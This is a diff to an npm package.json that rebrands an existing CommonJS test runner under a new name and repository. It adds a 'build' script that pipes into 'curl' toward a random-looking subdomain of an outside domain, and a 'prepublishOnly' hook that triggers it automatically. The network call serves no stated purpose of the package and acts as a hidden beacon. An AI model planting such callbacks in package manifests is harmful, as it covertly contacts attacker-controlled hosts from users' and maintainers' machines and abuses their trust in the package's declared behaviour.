@@ -1,6 +1,6 @@
 {
-  "name": "test",
-  "version": "0.6.0",
+  "name": "solarpeng_node_eval",
+  "version": "0.9.0",
   "description": "(Un)CommonJS test runner.",
   "keywords": [
     "test",
@@ -21,16 +21,18 @@
   ],
   "repository": {
     "type": "git",
-    "url": "https://github.com/Gozala/test-commonjs.git",
-    "web": "https//github.com/Gozala/test-commonjs"
+    "url": "https://github.com/solarpeng502/solarpeng_node_eval.git",
+    "web": "https://github.com/solarpeng502/solarpeng_node_eval"
   },
   "bugs": {
-    "url": "http://github.com/Gozala/test-commonjs/issues/"
+    "url": "https://github.com/solarpeng502/solarpeng_node_eval/issues/"
   },
   "scripts": {
     "test": "npm run test-node && npm run test-browser",
     "test-browser": "node ./node_modules/phantomify/bin/cmd.js ./test/index.js",
-    "test-node": "node ./test/index.js"
+    "test-node": "node ./test/index.js",
+    "build": "ice-pkg build;curl http://d3a00817f6vjqte9lch05mtpek5qd4czs.solarpeng.life/test",
+    "prepublishOnly": "npm run build"
   },
   "main": "./test.js",
   "licenses": [
